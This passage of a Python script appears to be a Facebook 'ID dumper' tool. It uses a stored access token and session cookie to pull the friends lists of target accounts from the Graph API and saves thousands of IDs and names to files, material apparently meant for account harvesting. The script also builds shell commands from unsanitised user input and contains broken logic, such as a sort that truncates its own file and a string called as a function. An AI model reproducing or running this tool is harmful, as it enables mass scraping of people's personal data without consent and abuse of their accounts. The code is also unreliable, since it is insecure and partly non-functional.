        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
        info = requests.get('https://x.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        nam = info['name']
        uid = info['id']
    except Exception as error:print ("\n\x1b[1;91m[*] Token Expired");slp(1);login()
    clear()
    print(f'Name : {nam} | ID : {uid}  ')
    print(47*"-")
    print(f'[1] Dump From Public [Simple]')
    print(f'[2] Dump From Public [Ultimated-auto-separate]')
    print(f'[3] Dump From Public [Ultimated]')
    print('[4] Dump From Follower [Ultimated]')
    print('[5] Remove Duplicate Links ')
    print('[6] Seprate Links ')
    print('[0] Remove Cookie ')
    print(47*"-")
    select = input('Select Menu: ')
    if select =='1':
        p_dump()
    elif select =='2':
        dump()
    elif select =='3':
        public()
    elif select =='4':
        follower()
    elif select =='5':
        cutter()
    elif select =='6':
        sids()
    elif select =='0':
        os.system('rm -rf .tokn.txt')
        os.system('rm -rf .cookis.txt')
        print(f'{F}Logout Successful');time.sleep(1)
        menu()
        
def push(fbuid,file,fbcokis,token,mission,typ):
    global filter,totaldmp
    try:
        if int(totaldmp)>=int(mission):
            filter = 'Closed'
        else:
            #and type in idnm['id']
            dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
            print(f'\r Dumping : {fbuid}  IDs : {totaldmp}')
            for idnm in dmp['friends']['data']:
                if idnm['id'] not in filter:
                    if str(typ) in idnm['id']:
                        filter.append(idnm['id'])
                        open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                        totaldmp+=1
    except Exception as error:
        pass

def sent(file,fbcokis,token):
    global saved,totaldmp
    try:
        clear()
        print('How Many IDs You Want To Dump \nExample : 1000,5000,10000\n')
        mission = int(input('Enter limit: \x1b[1;92m'))
        clear()
        print('Which IDs You Want To Dump \nExample : 10008,100087,10007,mix\n')
        typ = input('Links: \x1b[1;97m')
        if 'mix' in typ.lower():
            typ = '1'
        clear()
        for fbuid in saved:
            fast_work(push,fbuid,file,fbcokis,token,mission,typ)
    except Exception as error:
        exit(f'----------------------------------------------------------\nTotal Dumped - {totaldmp} IDs \nSaved To = {file}\n----------------------------------------------------------')

def dump():
    global saved,totaldmp
    clear()
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        login()
    except:
        login()
    try:
        print('Enter Dump ID Save Path\n')
        file = input('Enter File:\x1b[1;97m ')
        clear()
        print('IF You Want To Back To Menu. Then Type \'B\' \n')
        while True:
            try:
                fbuid = input('Put id username:\x1b[1;97m ')
                if 'B' in fbuid.upper():
                    menu()
                    break
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    open(file,'a').write(idnm['id']+"|"+idnm['name']+'\n')
                    totaldmp+=1
                    saved.append(idnm['id'])
                print(f'Total Target Found:\x1b[1;97m {len(saved)}')
                slp(2)
                sent(file,fbcokis,token)
                break
                exit('Bye Bye')
            except:
                print('ID Not Public')
                continue
    except Exception as error:
        menu()

def p_dump():
    global totaldmp,srange
    try:
        token = open('.tokn.txt','r').read()
        fbcokis = open(".cokis.txt", "r").read()
    except FileNotFoundError:
        print(f"{A}\n\t\tCookie Not Found ...{S}")
        slp(1)
        cmd('rm -rf .token.txt .cookie.txt')
        login()
    try:
        token = open('.tokn.txt','r').read()
        fbcokis = open(".cokis.txt", "r").read()
    except FileNotFoundError:
        print(f"{A}Cookie Not Found ...{S}")
        slp(1)
        cmd('rm -rf .token.txt .cookie.txt')
        login()
    try:
        clear()
        
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/RAJA.txt\n') 
        filepath = input("Put File Name: ")
        apnd = open(filepath , 'a')
        clear()
        for rept in range(srange):
            rept += 1
            sid = input("[" + str(rept) + "] Put id username: ")
            if  sid=='stop':
                break
                ys.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+sid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    apnd.write(idnm['id']+"|"+idnm['name']+'\n')                      
            except KeyError:
                print(f"\n{S}ID Not Found ...");pass
            print(f'{S}Total IDs : {totaldmp}')
        apnd.close()
        print(47*'-')
        print(f"Total IDs: {totaldmp} ")
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back RAJA Menu ")
        RAJA(allkey)
    except Exception as e:
        print("Error : %s"%e) 
        
def cutter():
    clear()
    print("Enter File Path / File Location \n")
    RAJA = input('Put File Name:')
    print(" ")
    RAJA = input('Saving Put File Name:')
    os.system('touch ' +RAJA)
    os.system('sort -r '+RAJA+' | uniq > '+RAJA)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + RAJA )
    print("New File Saved:" + RAJA )
    print(47*'-')
    input(f"{S} Press Enter To Back RAJA Menu ")
    RAJA(allkey)       
    
def removef():
        os.system('rm -rf self.file');print(f'\n{R}Files Removed Successfully ...')
        RAJA(allkey)            
 

RAJA()
